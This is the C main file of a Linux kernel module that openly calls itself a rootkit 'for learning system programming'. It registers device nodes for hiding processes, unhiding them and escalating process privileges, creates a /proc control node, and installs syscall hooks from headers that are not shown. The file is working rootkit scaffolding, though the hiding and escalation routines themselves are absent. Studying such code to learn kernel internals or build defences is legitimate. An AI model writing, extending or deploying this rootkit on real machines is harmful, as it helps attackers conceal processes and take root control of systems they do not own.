/* 
 * Rootkit main file
 */

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/sched.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/proc_fs.h>
#include <linux/stat.h>
#include <linux/version.h>
#include <linux/device.h>
#include <linux/cdev.h>
#include <linux/kdev_t.h>

#include "device.h"
#include "procfs.h"
#include "hooks/hooks.h"

#if defined(CONFIG_X86_64) && (LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0))
#define PTREGS_SYSCALL_STUBS 1
#endif

// Name of char device
#define DEVICE_NAME "rootkitdev"
#define HIDE_PROC_DEVICE_NAME "rootkitdev_hp"
#define UNHIDE_PROC_DEVICE_NAME "rootkitdev_uhp"
#define PROC_PRIV_DEVICE_NAME "rootkitdev_ppe"

// Name of procfs node
#define NAME_NODE "rootkitdev"


MODULE_LICENSE("GPL");
MODULE_AUTHOR("JubyL3y");
MODULE_DESCRIPTION("Simple rootkit for learning system programming");

// Major device number
static int majorNumber;
// Class struct
struct class* pClass;
// Combined Major and Minor numbers
dev_t devNo;
dev_t h_proc_no;
dev_t unh_proc_no;
dev_t ppe_proc_no;

// Structure with file operations for char device
// Functions defined in device.h
static struct file_operations fops = {
  .read = device_read,
  .write = device_write,
  .open = device_open,
  .release = device_release,
  .unlocked_ioctl = device_ioctl
};

static struct file_operations proc_fops = {
    .read = proc_node_read,
    .write = proc_node_write
};

static int __init module_load(void)
{
    int ret;
    struct proc_dir_entry *own_proc_node;
    struct device* p_dev;

    printk(KERN_INFO "Rootkit started\n");
    printk(KERN_INFO "Rootkit device name %s\n", DEVICE_NAME);
    majorNumber = register_chrdev (0, DEVICE_NAME, &fops);
    if(majorNumber < 0){
        printk( KERN_ERR "Registering the character device failed with %d\n", majorNumber);
        return majorNumber;
    }
    devNo = MKDEV(majorNumber, 0);
    h_proc_no = MKDEV(majorNumber, 1);
    unh_proc_no = MKDEV(majorNumber, 2);
    ppe_proc_no = MKDEV(majorNumber, 3);
    pClass = class_create(THIS_MODULE, DEVICE_NAME);
    if( IS_ERR(pClass)){
        printk(KERN_ERR "Can't create class with name %s for this module\n", DEVICE_NAME);
        unregister_chrdev(majorNumber, DEVICE_NAME);
        return -1;

    }
    if(IS_ERR(p_dev = device_create(pClass, NULL, devNo,NULL, DEVICE_NAME))){
        printk(KERN_ERR "Can't create device /dev/%s\n", DEVICE_NAME);
        class_destroy(pClass);
        unregister_chrdev(majorNumber, DEVICE_NAME);
        return -1;
    }

    if(IS_ERR(p_dev = device_create(pClass, NULL, h_proc_no,NULL, HIDE_PROC_DEVICE_NAME))){
        printk(KERN_ERR "Can't create device /dev/%s\n", DEVICE_NAME);
        class_destroy(pClass);
        unregister_chrdev_region(devNo, 1);
        unregister_chrdev(majorNumber, DEVICE_NAME);
        return -1;
    }

    if(IS_ERR(p_dev = device_create(pClass, NULL, unh_proc_no,NULL, UNHIDE_PROC_DEVICE_NAME))){
        printk(KERN_ERR "Can't create device /dev/%s\n", DEVICE_NAME);
        class_destroy(pClass);
        unregister_chrdev_region(devNo, 1);
        unregister_chrdev_region(h_proc_no, 1);
        unregister_chrdev(majorNumber, DEVICE_NAME);
        return -1;
    }

    if(IS_ERR(p_dev = device_create(pClass, NULL, ppe_proc_no,NULL, PROC_PRIV_DEVICE_NAME))){
        printk(KERN_ERR "Can't create device /dev/%s\n", DEVICE_NAME);
        class_destroy(pClass);
        unregister_chrdev_region(devNo, 1);
        unregister_chrdev_region(h_proc_no, 1);
        unregister_chrdev_region(unh_proc_no, 1);
        unregister_chrdev(majorNumber, DEVICE_NAME);
        return -1;
    }
    own_proc_node = proc_create(NAME_NODE, 0, NULL, &proc_fops); 
    if( NULL == own_proc_node ) {
        ret = -ENOMEM;
        device_destroy(pClass, majorNumber);
        class_destroy(pClass);
        unregister_chrdev_region(devNo, 1);
        unregister_chrdev_region(h_proc_no, 1);
        unregister_chrdev_region(unh_proc_no, 1);
        unregister_chrdev_region(ppe_proc_no, 1);
        unregister_chrdev(majorNumber, DEVICE_NAME);
        printk( KERN_ERR "can't create /proc/%s\n", NAME_NODE );
        return ret;
    }
    printk(KERN_INFO"Successfull registered /proc/%s node\n", NAME_NODE);
    printk( KERN_INFO "Register device with major number %d\n", majorNumber);
    printk( KERN_INFO "'mknod /dev/%s c %d 0'.\n",DEVICE_NAME, majorNumber);

    install_syscall_hooks();
	return 0;
}

static void __exit module_clear(void)
{

    device_destroy(pClass, devNo);
    device_destroy(pClass, h_proc_no);
    device_destroy(pClass, unh_proc_no);
    device_destroy(pClass, ppe_proc_no);
    class_destroy(pClass);
    unregister_chrdev_region(devNo, 1);
    unregister_chrdev_region(h_proc_no, 1);
    unregister_chrdev_region(unh_proc_no, 1);
    unregister_chrdev_region(ppe_proc_no, 1);
    unregister_chrdev(majorNumber, DEVICE_NAME);
    remove_proc_entry( NAME_NODE, NULL );
    remove_syscall_hooks();

    printk( KERN_INFO "Rootkit unloaded successfully\n");
}

module_init(module_load);
module_exit(module_clear);
